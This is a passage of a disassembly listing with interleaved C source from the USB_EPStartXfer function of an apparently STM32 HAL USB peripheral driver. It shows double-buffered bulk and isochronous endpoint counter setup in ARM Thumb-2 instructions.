 8007a3c:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007a40:	4413      	add	r3, r2
 8007a42:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007a46:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
 8007a4a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007a4e:	881b      	ldrh	r3, [r3, #0]
 8007a50:	b29b      	uxth	r3, r3
 8007a52:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007a56:	b29a      	uxth	r2, r3
 8007a58:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007a5c:	801a      	strh	r2, [r3, #0]
 8007a5e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007a62:	2b3e      	cmp	r3, #62	; 0x3e
 8007a64:	d924      	bls.n	8007ab0 <USB_EPStartXfer+0xec2>
 8007a66:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007a6a:	095b      	lsrs	r3, r3, #5
 8007a6c:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007a70:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007a74:	f003 031f 	and.w	r3, r3, #31
 8007a78:	2b00      	cmp	r3, #0
 8007a7a:	d104      	bne.n	8007a86 <USB_EPStartXfer+0xe98>
 8007a7c:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007a80:	3b01      	subs	r3, #1
 8007a82:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007a86:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007a8a:	881b      	ldrh	r3, [r3, #0]
 8007a8c:	b29a      	uxth	r2, r3
 8007a8e:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007a92:	b29b      	uxth	r3, r3
 8007a94:	029b      	lsls	r3, r3, #10
 8007a96:	b29b      	uxth	r3, r3
 8007a98:	4313      	orrs	r3, r2
 8007a9a:	b29b      	uxth	r3, r3
 8007a9c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007aa0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007aa4:	b29a      	uxth	r2, r3
 8007aa6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007aaa:	801a      	strh	r2, [r3, #0]
 8007aac:	f000 bc10 	b.w	80082d0 <USB_EPStartXfer+0x16e2>
 8007ab0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ab4:	2b00      	cmp	r3, #0
 8007ab6:	d10c      	bne.n	8007ad2 <USB_EPStartXfer+0xee4>
 8007ab8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007abc:	881b      	ldrh	r3, [r3, #0]
 8007abe:	b29b      	uxth	r3, r3
 8007ac0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007ac4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007ac8:	b29a      	uxth	r2, r3
 8007aca:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007ace:	801a      	strh	r2, [r3, #0]
 8007ad0:	e3fe      	b.n	80082d0 <USB_EPStartXfer+0x16e2>
 8007ad2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ad6:	085b      	lsrs	r3, r3, #1
 8007ad8:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007adc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ae0:	f003 0301 	and.w	r3, r3, #1
 8007ae4:	2b00      	cmp	r3, #0
 8007ae6:	d004      	beq.n	8007af2 <USB_EPStartXfer+0xf04>
 8007ae8:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007aec:	3301      	adds	r3, #1
 8007aee:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007af2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007af6:	881b      	ldrh	r3, [r3, #0]
 8007af8:	b29a      	uxth	r2, r3
 8007afa:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007afe:	b29b      	uxth	r3, r3
 8007b00:	029b      	lsls	r3, r3, #10
 8007b02:	b29b      	uxth	r3, r3
 8007b04:	4313      	orrs	r3, r2
 8007b06:	b29a      	uxth	r2, r3
 8007b08:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b0c:	801a      	strh	r2, [r3, #0]
 8007b0e:	e3df      	b.n	80082d0 <USB_EPStartXfer+0x16e2>
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* First Transfer Coming From HAL_PCD_EP_Receive & From ISR */
      /* Set the Double buffer counter */
      if (ep->type == EP_TYPE_BULK)
 8007b10:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b14:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b18:	681b      	ldr	r3, [r3, #0]
 8007b1a:	78db      	ldrb	r3, [r3, #3]
 8007b1c:	2b02      	cmp	r3, #2
 8007b1e:	f040 8218 	bne.w	8007f52 <USB_EPStartXfer+0x1364>
      {
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, ep->maxpacket);
 8007b22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b26:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b2a:	681b      	ldr	r3, [r3, #0]
 8007b2c:	785b      	ldrb	r3, [r3, #1]
 8007b2e:	2b00      	cmp	r3, #0
 8007b30:	f040 809d 	bne.w	8007c6e <USB_EPStartXfer+0x1080>
 8007b34:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b38:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b3c:	681b      	ldr	r3, [r3, #0]
 8007b3e:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 8007b42:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b46:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b4a:	681b      	ldr	r3, [r3, #0]
 8007b4c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007b50:	b29b      	uxth	r3, r3
 8007b52:	461a      	mov	r2, r3
 8007b54:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007b58:	4413      	add	r3, r2
 8007b5a:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 8007b5e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b62:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b66:	681b      	ldr	r3, [r3, #0]
 8007b68:	781b      	ldrb	r3, [r3, #0]
 8007b6a:	00da      	lsls	r2, r3, #3
 8007b6c:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007b70:	4413      	add	r3, r2
 8007b72:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007b76:	f8c7 30a8 	str.w	r3, [r7, #168]	; 0xa8
 8007b7a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007b7e:	881b      	ldrh	r3, [r3, #0]
 8007b80:	b29b      	uxth	r3, r3
 8007b82:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007b86:	b29a      	uxth	r2, r3
 8007b88:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007b8c:	801a      	strh	r2, [r3, #0]
 8007b8e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b92:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b96:	681b      	ldr	r3, [r3, #0]
 8007b98:	691b      	ldr	r3, [r3, #16]
 8007b9a:	2b3e      	cmp	r3, #62	; 0x3e
 8007b9c:	d92b      	bls.n	8007bf6 <USB_EPStartXfer+0x1008>
 8007b9e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ba2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ba6:	681b      	ldr	r3, [r3, #0]
 8007ba8:	691b      	ldr	r3, [r3, #16]
 8007baa:	095b      	lsrs	r3, r3, #5
 8007bac:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007bb0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bb4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bb8:	681b      	ldr	r3, [r3, #0]
 8007bba:	691b      	ldr	r3, [r3, #16]
 8007bbc:	f003 031f 	and.w	r3, r3, #31
 8007bc0:	2b00      	cmp	r3, #0
 8007bc2:	d104      	bne.n	8007bce <USB_EPStartXfer+0xfe0>
 8007bc4:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007bc8:	3b01      	subs	r3, #1
 8007bca:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007bce:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007bd2:	881b      	ldrh	r3, [r3, #0]
 8007bd4:	b29a      	uxth	r2, r3
 8007bd6:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007bda:	b29b      	uxth	r3, r3
 8007bdc:	029b      	lsls	r3, r3, #10
 8007bde:	b29b      	uxth	r3, r3
 8007be0:	4313      	orrs	r3, r2
 8007be2:	b29b      	uxth	r3, r3
 8007be4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007be8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007bec:	b29a      	uxth	r2, r3
 8007bee:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007bf2:	801a      	strh	r2, [r3, #0]
 8007bf4:	e070      	b.n	8007cd8 <USB_EPStartXfer+0x10ea>
 8007bf6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bfa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bfe:	681b      	ldr	r3, [r3, #0]
 8007c00:	691b      	ldr	r3, [r3, #16]
 8007c02:	2b00      	cmp	r3, #0
 8007c04:	d10c      	bne.n	8007c20 <USB_EPStartXfer+0x1032>
 8007c06:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c0a:	881b      	ldrh	r3, [r3, #0]
 8007c0c:	b29b      	uxth	r3, r3
 8007c0e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007c12:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007c16:	b29a      	uxth	r2, r3
 8007c18:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c1c:	801a      	strh	r2, [r3, #0]
 8007c1e:	e05b      	b.n	8007cd8 <USB_EPStartXfer+0x10ea>
 8007c20:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c24:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c28:	681b      	ldr	r3, [r3, #0]
 8007c2a:	691b      	ldr	r3, [r3, #16]
 8007c2c:	085b      	lsrs	r3, r3, #1
 8007c2e:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007c32:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c36:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c3a:	681b      	ldr	r3, [r3, #0]
 8007c3c:	691b      	ldr	r3, [r3, #16]
 8007c3e:	f003 0301 	and.w	r3, r3, #1
 8007c42:	2b00      	cmp	r3, #0
 8007c44:	d004      	beq.n	8007c50 <USB_EPStartXfer+0x1062>
 8007c46:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007c4a:	3301      	adds	r3, #1
 8007c4c:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007c50:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c54:	881b      	ldrh	r3, [r3, #0]
 8007c56:	b29a      	uxth	r2, r3
 8007c58:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007c5c:	b29b      	uxth	r3, r3
 8007c5e:	029b      	lsls	r3, r3, #10
 8007c60:	b29b      	uxth	r3, r3
 8007c62:	4313      	orrs	r3, r2
 8007c64:	b29a      	uxth	r2, r3
 8007c66:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c6a:	801a      	strh	r2, [r3, #0]
 8007c6c:	e034      	b.n	8007cd8 <USB_EPStartXfer+0x10ea>
 8007c6e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c72:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c76:	681b      	ldr	r3, [r3, #0]
 8007c78:	785b      	ldrb	r3, [r3, #1]
 8007c7a:	2b01      	cmp	r3, #1
 8007c7c:	d12c      	bne.n	8007cd8 <USB_EPStartXfer+0x10ea>
 8007c7e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c82:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007c86:	681b      	ldr	r3, [r3, #0]
 8007c88:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007c8c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c90:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007c94:	681b      	ldr	r3, [r3, #0]
 8007c96:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007c9a:	b29b      	uxth	r3, r3
 8007c9c:	461a      	mov	r2, r3
 8007c9e:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007ca2:	4413      	add	r3, r2
 8007ca4:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007ca8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cac:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cb0:	681b      	ldr	r3, [r3, #0]
 8007cb2:	781b      	ldrb	r3, [r3, #0]
 8007cb4:	00da      	lsls	r2, r3, #3
 8007cb6:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007cba:	4413      	add	r3, r2
 8007cbc:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007cc0:	f8c7 30b0 	str.w	r3, [r7, #176]	; 0xb0
 8007cc4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cc8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ccc:	681b      	ldr	r3, [r3, #0]
 8007cce:	691b      	ldr	r3, [r3, #16]
 8007cd0:	b29a      	uxth	r2, r3
 8007cd2:	f8d7 30b0 	ldr.w	r3, [r7, #176]	; 0xb0
 8007cd6:	801a      	strh	r2, [r3, #0]
 8007cd8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cdc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ce0:	681b      	ldr	r3, [r3, #0]
 8007ce2:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007ce6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cea:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cee:	681b      	ldr	r3, [r3, #0]
 8007cf0:	785b      	ldrb	r3, [r3, #1]
 8007cf2:	2b00      	cmp	r3, #0
 8007cf4:	f040 809d 	bne.w	8007e32 <USB_EPStartXfer+0x1244>
 8007cf8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cfc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d00:	681b      	ldr	r3, [r3, #0]
 8007d02:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007d06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d0a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d0e:	681b      	ldr	r3, [r3, #0]
 8007d10:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007d14:	b29b      	uxth	r3, r3
 8007d16:	461a      	mov	r2, r3
 8007d18:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007d1c:	4413      	add	r3, r2
 8007d1e:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007d22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d26:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d2a:	681b      	ldr	r3, [r3, #0]
 8007d2c:	781b      	ldrb	r3, [r3, #0]
 8007d2e:	00da      	lsls	r2, r3, #3
 8007d30:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007d34:	4413      	add	r3, r2
 8007d36:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007d3a:	f8c7 3098 	str.w	r3, [r7, #152]	; 0x98
 8007d3e:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007d42:	881b      	ldrh	r3, [r3, #0]
 8007d44:	b29b      	uxth	r3, r3
 8007d46:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007d4a:	b29a      	uxth	r2, r3
 8007d4c:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007d50:	801a      	strh	r2, [r3, #0]
 8007d52:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d56:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d5a:	681b      	ldr	r3, [r3, #0]
 8007d5c:	691b      	ldr	r3, [r3, #16]
 8007d5e:	2b3e      	cmp	r3, #62	; 0x3e
 8007d60:	d92b      	bls.n	8007dba <USB_EPStartXfer+0x11cc>
 8007d62:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d66:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d6a:	681b      	ldr	r3, [r3, #0]
 8007d6c:	691b      	ldr	r3, [r3, #16]
 8007d6e:	095b      	lsrs	r3, r3, #5
 8007d70:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007d74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d78:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d7c:	681b      	ldr	r3, [r3, #0]
 8007d7e:	691b      	ldr	r3, [r3, #16]
 8007d80:	f003 031f 	and.w	r3, r3, #31
 8007d84:	2b00      	cmp	r3, #0
 8007d86:	d104      	bne.n	8007d92 <USB_EPStartXfer+0x11a4>
 8007d88:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007d8c:	3b01      	subs	r3, #1
 8007d8e:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007d92:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007d96:	881b      	ldrh	r3, [r3, #0]
 8007d98:	b29a      	uxth	r2, r3
 8007d9a:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007d9e:	b29b      	uxth	r3, r3
 8007da0:	029b      	lsls	r3, r3, #10
 8007da2:	b29b      	uxth	r3, r3
 8007da4:	4313      	orrs	r3, r2
 8007da6:	b29b      	uxth	r3, r3
 8007da8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007dac:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007db0:	b29a      	uxth	r2, r3
 8007db2:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007db6:	801a      	strh	r2, [r3, #0]
 8007db8:	e069      	b.n	8007e8e <USB_EPStartXfer+0x12a0>
 8007dba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dbe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dc2:	681b      	ldr	r3, [r3, #0]
 8007dc4:	691b      	ldr	r3, [r3, #16]
 8007dc6:	2b00      	cmp	r3, #0
 8007dc8:	d10c      	bne.n	8007de4 <USB_EPStartXfer+0x11f6>
 8007dca:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007dce:	881b      	ldrh	r3, [r3, #0]
 8007dd0:	b29b      	uxth	r3, r3
 8007dd2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007dd6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007dda:	b29a      	uxth	r2, r3
 8007ddc:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007de0:	801a      	strh	r2, [r3, #0]
 8007de2:	e054      	b.n	8007e8e <USB_EPStartXfer+0x12a0>
 8007de4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007de8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dec:	681b      	ldr	r3, [r3, #0]
 8007dee:	691b      	ldr	r3, [r3, #16]
 8007df0:	085b      	lsrs	r3, r3, #1
 8007df2:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007df6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dfa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dfe:	681b      	ldr	r3, [r3, #0]
 8007e00:	691b      	ldr	r3, [r3, #16]
 8007e02:	f003 0301 	and.w	r3, r3, #1
 8007e06:	2b00      	cmp	r3, #0
 8007e08:	d004      	beq.n	8007e14 <USB_EPStartXfer+0x1226>
 8007e0a:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007e0e:	3301      	adds	r3, #1
 8007e10:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007e14:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e18:	881b      	ldrh	r3, [r3, #0]
 8007e1a:	b29a      	uxth	r2, r3
 8007e1c:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007e20:	b29b      	uxth	r3, r3
 8007e22:	029b      	lsls	r3, r3, #10
 8007e24:	b29b      	uxth	r3, r3
 8007e26:	4313      	orrs	r3, r2
 8007e28:	b29a      	uxth	r2, r3
 8007e2a:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e2e:	801a      	strh	r2, [r3, #0]
 8007e30:	e02d      	b.n	8007e8e <USB_EPStartXfer+0x12a0>
 8007e32:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e36:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e3a:	681b      	ldr	r3, [r3, #0]
 8007e3c:	785b      	ldrb	r3, [r3, #1]
 8007e3e:	2b01      	cmp	r3, #1
 8007e40:	d125      	bne.n	8007e8e <USB_EPStartXfer+0x12a0>
 8007e42:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e46:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e4a:	681b      	ldr	r3, [r3, #0]
 8007e4c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007e50:	b29b      	uxth	r3, r3
 8007e52:	461a      	mov	r2, r3
 8007e54:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007e58:	4413      	add	r3, r2
 8007e5a:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007e5e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e62:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e66:	681b      	ldr	r3, [r3, #0]
 8007e68:	781b      	ldrb	r3, [r3, #0]
 8007e6a:	00da      	lsls	r2, r3, #3
 8007e6c:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007e70:	4413      	add	r3, r2
 8007e72:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007e76:	f8c7 30a0 	str.w	r3, [r7, #160]	; 0xa0
 8007e7a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e7e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e82:	681b      	ldr	r3, [r3, #0]
 8007e84:	691b      	ldr	r3, [r3, #16]
 8007e86:	b29a      	uxth	r2, r3
 8007e88:	f8d7 30a0 	ldr.w	r3, [r7, #160]	; 0xa0
 8007e8c:	801a      	strh	r2, [r3, #0]

        /* Coming from ISR */
        if (ep->xfer_count != 0U)
 8007e8e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e92:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e96:	681b      	ldr	r3, [r3, #0]
 8007e98:	69db      	ldr	r3, [r3, #28]
 8007e9a:	2b00      	cmp	r3, #0
 8007e9c:	f000 8218 	beq.w	80082d0 <USB_EPStartXfer+0x16e2>
        {
          /* update last value to check if there is blocking state */
          wEPVal = PCD_GET_ENDPOINT(USBx, ep->num);
 8007ea0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ea4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ea8:	681a      	ldr	r2, [r3, #0]
 8007eaa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007eae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007eb2:	681b      	ldr	r3, [r3, #0]
 8007eb4:	781b      	ldrb	r3, [r3, #0]
 8007eb6:	009b      	lsls	r3, r3, #2
 8007eb8:	4413      	add	r3, r2
 8007eba:	881b      	ldrh	r3, [r3, #0]
 8007ebc:	f8a7 3096 	strh.w	r3, [r7, #150]	; 0x96

          /*Blocking State */
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007ec0:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007ec4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8007ec8:	2b00      	cmp	r3, #0
 8007eca:	d005      	beq.n	8007ed8 <USB_EPStartXfer+0x12ea>
 8007ecc:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007ed0:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007ed4:	2b00      	cmp	r3, #0
 8007ed6:	d10d      	bne.n	8007ef4 <USB_EPStartXfer+0x1306>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007ed8:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007edc:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007ee0:	2b00      	cmp	r3, #0
 8007ee2:	f040 81f5 	bne.w	80082d0 <USB_EPStartXfer+0x16e2>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007ee6:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007eea:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007eee:	2b00      	cmp	r3, #0
 8007ef0:	f040 81ee 	bne.w	80082d0 <USB_EPStartXfer+0x16e2>
          {
            PCD_FREE_USER_BUFFER(USBx, ep->num, 0U);
 8007ef4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ef8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007efc:	681a      	ldr	r2, [r3, #0]
 8007efe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f02:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f06:	681b      	ldr	r3, [r3, #0]
 8007f08:	781b      	ldrb	r3, [r3, #0]
 8007f0a:	009b      	lsls	r3, r3, #2
 8007f0c:	4413      	add	r3, r2
 8007f0e:	881b      	ldrh	r3, [r3, #0]
 8007f10:	b29b      	uxth	r3, r3
 8007f12:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007f16:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007f1a:	f8a7 3094 	strh.w	r3, [r7, #148]	; 0x94
 8007f1e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f22:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f26:	681a      	ldr	r2, [r3, #0]
 8007f28:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f2c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f30:	681b      	ldr	r3, [r3, #0]
 8007f32:	781b      	ldrb	r3, [r3, #0]
 8007f34:	009b      	lsls	r3, r3, #2
 8007f36:	441a      	add	r2, r3
 8007f38:	f8b7 3094 	ldrh.w	r3, [r7, #148]	; 0x94
 8007f3c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007f40:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007f44:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007f48:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8007f4c:	b29b      	uxth	r3, r3
 8007f4e:	8013      	strh	r3, [r2, #0]
 8007f50:	e1be      	b.n	80082d0 <USB_EPStartXfer+0x16e2>
          }
        }
      }
      /* iso out double */
      else if (ep->type == EP_TYPE_ISOC)
 8007f52:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f56:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f5a:	681b      	ldr	r3, [r3, #0]
 8007f5c:	78db      	ldrb	r3, [r3, #3]
 8007f5e:	2b01      	cmp	r3, #1
 8007f60:	f040 81b4 	bne.w	80082cc <USB_EPStartXfer+0x16de>
      {
        /* Multi packet transfer */
        if (ep->xfer_len > ep->maxpacket)
 8007f64:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f68:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f6c:	681b      	ldr	r3, [r3, #0]
 8007f6e:	699a      	ldr	r2, [r3, #24]
 8007f70:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f74:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f78:	681b      	ldr	r3, [r3, #0]
 8007f7a:	691b      	ldr	r3, [r3, #16]
 8007f7c:	429a      	cmp	r2, r3
 8007f7e:	d917      	bls.n	8007fb0 <USB_EPStartXfer+0x13c2>
        {
          len = ep->maxpacket;
